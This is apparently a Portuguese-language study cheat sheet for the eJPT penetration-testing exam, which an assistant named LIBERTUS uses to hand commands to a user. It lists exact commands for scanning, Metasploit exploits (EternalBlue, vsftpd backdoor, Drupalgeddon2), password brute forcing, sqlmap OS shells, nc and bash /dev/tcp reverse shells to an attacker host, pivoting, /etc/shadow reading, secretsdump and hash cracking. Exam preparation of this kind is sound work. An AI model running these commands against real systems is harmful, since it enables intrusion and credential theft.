# CHEAT SHEET eJPT — Comandos Exatos
Atualizado 2026-10-14 (véspera do exame) e **revisado 2026-10-18** com testes reais na máquina de apoio.
Uso: LIBERTUS copia daqui e manda pronto pro Lorran colar.
Substituir `IP` = alvo, `LHOST` = IP do Kali (descobrir com `ip addr`), `RANGE` = ex 192.168.100.

---

## ⚡ REGRAS DE OURO (validadas no lab, 18/out)

1. **Arquivo de ferramenta snap → sempre em `$HOME`.** nmap, sqlmap, msfconsole e msfvenom vêm de snap
   e **não enxergam `/tmp`** (`Failed to open input file /tmp/...`, `does not exist`).
   Lista de alvos → `~/targets.txt`. Request do Burp → `~/req.txt`. Payload → `~/payloads/x.elf`.
2. **Metasploit agora tem banco** (`msfdb init` feito). Usar `creds`, `hosts`, `services`, `loot`,
   `db_import ~/scan.xml`. Se cair: `msfdb restart`.
3. **John só via `john`** (wrapper `~/bin/john` → `~/john-home/john`). `/usr/local/bin/john` está quebrado.
4. **hydra local não faz SSH nem RDP.** SSH → `ssh_brute.py` ou msf `ssh_login`. RDP → msf `rdp_scanner`.
5. **Falso positivo de hydra existe.** DVWA 1.10 deu `admin:123456789` sem ser verdade (CSRF token).
   Sempre confirmar com `curl -i` antes de responder questão.
6. **Gobuster em SPA** (React/Angular) devolve 200 em tudo → `--exclude-length N` (o próprio erro informa N).
7. **`nc` local é OpenBSD: não tem `-e`.** Reverse shell com `mkfifo` ou `bash -i >& /dev/tcp/...`.
8. **Sessão msf aberta trava o `exit`** → `exit -y`.

## 📋 FORMATO DO EXAME (eJPT v2 / INE — conferido em Out/2026)
- **35 questões** de múltipla escolha sobre um lab prático, **48 horas** de acesso.
- Aprovação: **70%** (~25 de 35). Média de conclusão relatada: 6-12h.
- Domínios: Metodologia **25%** · Auditoria de hosts/redes **25%** · Pentest de hosts/redes **50%**.
- **Metasploit é permitido e esperado** (diferente do OSCP).
- Estratégia: **ler a questão primeiro** — o enunciado diz qual serviço/host investigar. Não escanear às cegas.

---

## 0. DESCOBERTA INICIAL (sempre começar aqui)
```bash
ip addr                              # descobrir IP do Kali e a rede
ip route                             # ver gateways/rotas (dica de rede interna)
nmap -sn RANGE.0/24                  # ping sweep — lista hosts vivos
```
Excluir da contagem: `.1` (gateway) e o IP do próprio Kali.

---

## 1. NMAP
### Scans base
```bash
nmap -sV -sC IP                      # versão + scripts default (padrão de entrada)
nmap -p- -T4 IP                      # TODAS as 65535 portas TCP
nmap -sV -p- -T4 IP                  # completo (mais lento)
nmap -A IP                           # OS + versão + scripts + traceroute
nmap -sU --top-ports 20 IP           # UDP top 20 (SNMP 161, TFTP 69, etc.)
nmap -Pn IP                          # se host bloqueia ping mas está vivo
nmap -sV -oN scan.txt IP             # salvar output em arquivo
```
### Flags úteis
- `-sV` versão de serviço · `-sC` scripts default · `-O` OS (pode ser unreliable)
- `-p 80,443,445` portas específicas · `-p-` todas · `-T4` rápido
- `-Pn` pular ping · `-oN arquivo` salvar · `-v` verbose
- `--reason` **mostra POR QUE o nmap achou o host up/down** — usar sempre que
  o resultado parecer errado (`arp-response`, `syn-ack`, `user-set`, `no-response`)

### "Host seems down" — a decisão medida (lab 18/10/2026)
| Situação | O que decide | O que fazer |
|---|---|---|
| Mesma rede local (/24) | **ARP** — responde mesmo com `iptables -P INPUT DROP` | se diz down, o host está desligado; não precisa `-Pn` |
| Através de roteador/VPN/pivô | ICMP echo + SYN/443 + ACK/80 + timestamp | **`-Pn` sempre** — host com ICMP filtrado é invisível |
| Via proxychains (SOCKS) | só `connect()` em **80 e 443** | `-Pn` é obrigatório; `-sn` pelo proxy não descobre nada |
| Descobrir por SOCKS sem `-Pn` | `-PS<porta real>` (vira connect) | `nmap -sn -PS22,80,443,445,8080 IP` |
| `-p X` deu "host down" | a porta **nunca foi testada** | repetir com `-Pn` antes de concluir |

```bash
# custo medido numa /24: discovery 26,3 s (e esconde ICMP-filtrado)
#                        -Pn       2,2 s (e mostra tudo)
nmap -sn -PS22,80,443,445,8080 IP     # discovery em rede roteada
nmap -Pn -p- -T4 IP                   # pivô: não perde tempo com ping
nmap -Pn -p8080 --reason IP           # open/syn-ack vs filtered/no-response
```
Regra: `filtered` ≠ `down`. `filtered` = host vivo, firewall dropando.
Análise completa + pcaps: `evolucao/analise_2026-10-18_host-discovery-nmap-arp.md`

### NSE relevantes no exame
```bash
# SMB (o mais importante)
nmap -p445 --script smb-os-discovery IP          # versão exata do Windows (MELHOR que -O)
nmap -p445 --script smb-vuln-ms17-010 IP         # EternalBlue — confirma antes de explorar
nmap -p445 --script "smb-vuln-*" IP              # todas vulns SMB (ms17-010, ms08-067, conficker...)
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-enum-domains IP
nmap -p139,445 --script smb-security-mode,smb2-security-mode IP   # assinatura SMB

# FTP
nmap -p21 --script ftp-anon IP                   # login anônimo permitido?
nmap -p21 --script ftp-* IP                      # ftp-bounce, ftp-vsftpd-backdoor, ftp-proftpd-backdoor

# HTTP
nmap -p80,8080 --script http-enum IP             # enumera dirs/apps conhecidos
nmap -p80 --script http-title,http-headers IP
nmap -p80 --script http-wordpress-enum IP        # CMS WordPress
nmap -p80 --script http-shellshock IP            # CGI shellshock
nmap -p80 --script http-methods IP               # métodos (PUT habilitado = upload)

# SSH (bruteforce via nmap — funciona mesmo sem hydra SSH)
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
nmap -p22 --script ssh-auth-methods IP           # quais métodos de auth o servidor aceita
```

---

## 2. METASPLOIT
### Fluxo padrão
```bash
msfconsole -q
search TERMO                         # ex: search ms17-010
use exploit/CAMINHO                  # ex: use exploit/windows/smb/ms17_010_eternalblue
info                                 # detalhes do módulo
show options                         # ver o que precisa configurar
set RHOSTS IP
set LHOST LHOST_DO_KALI
run                                  # ou 'exploit'
# se "Cannot reliably check exploitability":
set ForceExploit true
run
```
### ONELINER (usar no lab INE — copy/paste múltiplo quebra)
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run"
```
### Módulos mais cobrados
```bash
# MS17-010 EternalBlue (SMB/445) — o mais frequente no eJPT
use exploit/windows/smb/ms17_010_eternalblue
# Verificar antes:
use auxiliary/scanner/smb/smb_ms17_010

# MS17-010 via psexec (alternativa quando eternalblue falha)
use exploit/windows/smb/ms17_010_psexec

# FTP anonymous / vsftpd backdoor
use auxiliary/scanner/ftp/anonymous
use exploit/unix/ftp/vsftpd_234_backdoor

# SSH bruteforce
use auxiliary/scanner/ssh/ssh_login
set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run

# Drupal (visto no exame real)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS IP; set TARGETURI /drupal; run

# Handler p/ receber shell de exploit manual
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT 4444; run

# Upgrade shell simples -> meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1; run
```
> Verificado hoje: `ms17_010_eternalblue`, `vsftpd_234_backdoor`, `ssh_login`, `autoroute`, `socks_proxy`, `multi/handler` todos presentes no MSF local.
### Meterpreter — pós-exploração
```bash
sysinfo · getuid · getprivs · hashdump
shell                                # cai no shell nativo
background                           # volta pro msf mantendo a sessão
sessions -l                          # listar sessões
sessions -i 1                        # interagir com sessão 1
search post/multi/manage/shell_to_meterpreter   # upgrade shell->meterpreter
```

---

## 3. HYDRA
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP
hydra -L users.txt -P pass.txt ssh://IP -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP

# HTTP POST (formulário de login) — ajustar campos e a string de falha
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# HTTP GET Basic Auth
hydra -l admin -P pass.txt IP http-get /admin
```
Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas · `-t N` threads · `-f` para no 1º hit · `-s PORTA`.
**Pitfall:** rockyou+SSH é LENTÍSSIMO (~9000h estimado no exame). Preferir credenciais achadas em arquivos/CMS, ou wordlist pequena. Usar hydra só quando há alvo pequeno/óbvio.

### SSH bruteforce — fallbacks (hydra LOCAL não tem SSH)
No Kali da INE o hydra tem SSH. No apoio LOCAL do LIBERTUS o hydra foi compilado sem libssh → usar:
```bash
# 1) script próprio (paramiko, testado contra SSH real)
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -l root -P ~/wordlists/pass/top10k.txt -T 4 -s
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -L ~/wordlists/user/top-usernames.txt -P ~/wordlists/pass/top1000.txt

# 2) Metasploit (recomendado — abre sessão)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
# depois: sessions -l  /  sessions -i 1

# 3) nmap
nmap -p22 --script ssh-brute --script-args userdb=~/users.txt,passdb=~/wordlists/pass/top10k.txt IP

# 4) wrapper local com sshpass
bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /home/libertus/wordlists/pass/top10k.txt
```
**Mito a evitar:** rockyou inteiro (14M) em SSH = horas. Usar top1000/top10k ou credenciais já achadas. `-f`/`-s` para no primeiro acerto.

### RDP (3389) — hydra local também NÃO tem
```bash
# detectar versão e se RDP está exposto
nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info IP
# bruteforce com Metasploit
msfconsole -q -x "use auxiliary/scanner/rdp/rdp_login; set RHOSTS IP; set USERNAME administrator; \
 set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; run; exit -y"
# acesso
xfreerdp /v:IP /u:usuario /p:senha /cert:ignore
```
BlueKeep (CVE-2019-0708): `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` — só em Win7/2008.

---

## 4. GOBUSTER
```bash
# Diretórios (wordlists novas, mais completas — baixadas 18/out)
gobuster dir -u http://IP -w ~/wordlists/web/directory-list-2.3-medium.txt -t 50 --no-error
gobuster dir -u http://IP -w ~/wordlists/web/directory-list-2.3-small.txt -x php,txt,html -t 50
gobuster dir -u http://IP:8080 -w /usr/share/wordlists/common.txt -t 50
gobuster dir -u http://IP -w ~/wordlists/web/raft-small-words.txt -x php -t 40

# SPA (React/Angular/Juice Shop): tudo devolve 200 -> excluir o tamanho do 404 falso
gobuster dir -u http://IP -w ~/wordlists/web/raft-small-words.txt --exclude-length 9903 -t 40

# DNS/vhost
gobuster vhost -u http://IP -w ~/wordlists/web/subdomains-5000.txt --append-domain
gobuster dns -d dominio.local -w ~/wordlists/web/subdomains-5000.txt
```
Flags: `-u` URL · `-w` wordlist · `-x` extensões · `-t` threads · `-s` status codes ·
`-b` blacklist · `--no-error` (não aborta em erro) · `--exclude-length` (mata wildcard de SPA).
Wordlists locais: `~/wordlists/web/*` (SecLists) e `/usr/share/wordlists/common.txt`.
No Kali INE: `/usr/share/wordlists/dirb/common.txt` (common.txt da raiz não existe).
`gobuster version` NÃO existe — use `gobuster -h`.

---

## 5. SQLMAP
```bash
# Detecção
sqlmap -u "http://IP/page.php?id=1" --batch
sqlmap -u "http://IP/page.php?id=1" --dbs --batch        # listar bancos
sqlmap -u "http://IP/page.php?id=1" -D nome --tables --batch
sqlmap -u "http://IP/page.php?id=1" -D nome -T users --dump --batch
# POST / cookies
sqlmap -u "http://IP/login.php" --data="user=a&pass=b" --batch
sqlmap -u "http://IP/page" --cookie="PHPSESSID=xxx" --batch
# Shell / arquivo
sqlmap -u "..." --os-shell --batch
```
Flags: `--batch` (sem perguntas) · `--dbs` · `--tables` · `--dump` · `-D`/`-T`/`-C` · `--level 3 --risk 2` (mais agressivo) · `--cookie`.

---

## 6. NETCAT
```bash
# Listener no atacante (Kali)
nc -lvnp 4444

# Reverse shell (rodar NO ALVO)
nc -e /bin/sh LHOST 4444                 # Linux com nc que tem -e
nc -e cmd.exe LHOST 4444                 # Windows
# Sem -e (nc BSD/Linux moderno):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
bash -i >& /dev/tcp/LHOST/4444 0>&1      # sem nc nenhum (bash puro)

# Bind shell (alvo escuta, atacante conecta)
nc -lvnp 4444 -e /bin/sh                 # no alvo
nc IP 4444                               # no atacante

# Transferência de arquivo
nc -lvnp 4444 > recebido.txt             # recebedor
nc IP 4444 < arquivo.txt                 # enviador

# Banner grab
nc -nv IP 21
```
Após pegar shell: estabilizar com `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

---

## 7. PIVOTING (Metasploit) — OBRIGATÓRIO no exame
Depois de ter uma sessão meterpreter num host dual-homed:
```bash
# Dentro do meterpreter — descobrir rede interna
run get_local_subnets            # ou: shell -> ip addr / ipconfig /all

# Adicionar rota automática para a rede interna
run autoroute -s 192.168.0.0/24
# (ou manual do msf:)
background
route add 192.168.0.0 255.255.255.0 1     # 1 = id da sessão
route print

# Agora scanners do msf alcançam a rede interna
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.0/24; set PORTS 22,80,445,3306; run

# Port forward (acessar serviço interno via localhost do Kali)
# no meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.0.10
portfwd list

# SOCKS proxy para usar nmap/hydra na rede interna via proxychains
use auxiliary/server/socks_proxy
set VERSION 4a; set SRVPORT 1080; run
# depois: proxychains nmap -sT -Pn 192.168.0.10
```
Sequência mental: sessão no host de borda → `ipconfig /all`/`ip addr` p/ achar 2ª rede → `autoroute` → portscan interno → explorar/portfwd.

---

## 8. ESCALADA DE PRIVILÉGIO (Linux) — gap da 1ª tentativa
```bash
# SUID (o clássico do eJPT)
find / -perm -4000 -type f 2>/dev/null
# se 'find' for SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit
# sudo mal configurado
sudo -l
# consultar GTFOBins pro binário achado

# hashes
cat /etc/passwd; cat /etc/shadow
# quebrar
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## 9. QUEBRA DE HASH (John)
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
john hash.txt --format=NT --wordlist=rockyou.txt      # NTLM Windows
# apoio local LIBERTUS:
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---
## 10. ARSENAL LOCAL LIBERTUS (fora do exame — simulação/validação)
Ferramentas extras no Ubuntu do Lorran (verificadas 14/10):
```bash
nikto -h http://IP                       # scanner web geral (SSL OK)
ffuf -u http://IP/FUZZ -w /usr/share/wordlists/common.txt   # fuzzing rápido
nuclei -u http://IP -severity critical,high                 # templates de vuln
subfinder -d dominio.com                                    # subdomínios
proxychains: AUSENTE → usar socks_proxy do MSF + route add (não precisa de proxychains no host)
searchsploit: AUSENTE → usar https://www.exploit-db.com no navegador ou 'msfconsole search'
wpscan: AUSENTE → usar 'nmap --script http-wordpress-enum' + manual
```

---

## LEMBRETES DO LAB INE
- Terminal Kali via browser NÃO cola (Ctrl+V/Shift+V/botão meio falham) e NÃO digita "?". Workarounds: barra do Chrome para URLs com "?", webshell de host comprometido para colar, msfconsole `-x` para comandos compostos, Telegram como fonte de cópia.
- rockyou em `.gz` no Kali INE → `gunzip` antes. common.txt não existe lá.
- Reutilizar credenciais em TODOS os serviços — tema recorrente.

---

# ADENDO 19/OUT — o que foi EXECUTADO hoje (e o que isso muda no comando)

## A. SMB — cadeia completa validada (era só teoria antes)

**Enum anônimo de shares**
```bash
smbclient -L //IP -N
smbclient -L //IP -N --option='client min protocol=NT1' --option='client max protocol=NT1'   # alvo SMB1 antigo
```
**Acessar share com credencial**
```bash
smbclient //IP/SHARE -U 'usuario%senha' -c 'ls'
smbclient //IP/SHARE -U 'usuario%senha' -c 'more arquivo.txt'    # `cat` não existe no smbclient novo
smbclient //IP/SHARE -U 'usuario%senha' -c 'get arquivo.txt'
```
> `cat` dá `command not found`; o comando é **`more`**. Erro comum e que faz perder tempo no exame.

**Sem smbclient (ou para automatizar) — Impacket**
```bash
~/venvs/pentest/bin/smbclient.py usuario:'senha'@IP
~/venvs/pentest/bin/psexec.py usuario:'senha'@IP          # shell SYSTEM se admin
~/venvs/pentest/bin/wmiexec.py usuario:'senha'@IP
~/venvs/pentest/bin/secretsdump.py usuario:'senha'@IP
```
**Bruteforce SMB (hydra local NÃO tem smb)**
```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; set PASS_FILE ~/pass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run"
```
*Validado hoje: achou `analyst:LabPass123!` em 172.28.77.11. Sem `VERBOSE true` o msf não imprime o acerto.*

## B. SQLi com sessão — o fluxo que realmente extrai dados

```bash
# 1) pegar o cookie (login real)
curl -s -c ~/ck.txt http://IP/login.php -o ~/login.html
TOKEN=$(grep -oP "name='user_token' value='\K[0-9a-f]+" ~/login.html)
curl -s -b ~/ck.txt -c ~/ck.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://IP/login.php
# 2) usar o cookie no sqlmap
sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$(grep PHPSESSID ~/ck.txt | awk '{print $7}'); security=low" --batch --dbs
```
*Validado hoje:* detectou boolean/error/time/UNION e dumpou `dvwa.users` (5 linhas + hashes md5).
Hash `5f4dcc3b5aa765d61d8327deb882cf99` = `password` (john confirmou).

## C. Regra de confirmação (hydra mente)

Hoje o hydra devolveu **duas** senhas para o mesmo formulário; só uma era verdadeira.
**Todo acerto de hydra é suspeito até confirmação:**
```bash
curl -s -i -d "username=admin&password=SENHA" http://IP/login.php | head -20
# ou tentar o login de verdade no navegador / no serviço
```
Se a aplicação usa **token CSRF** (DVWA 1.10 usa), hydra http-post-form **não é confiável** —
preferir login manual com credencial conhecida, ou msf/http_login, ou script próprio.

## D. Reverse shell — teste de loopback

`nc -lvnp 4455` + `bash -i >& /dev/tcp/127.0.0.1/4455 0>&1` → **Connection received** ✅
(o `nc` local é OpenBSD: sem `-e`; as variantes com `mkfifo` e `/dev/tcp` do §6 são as que valem).

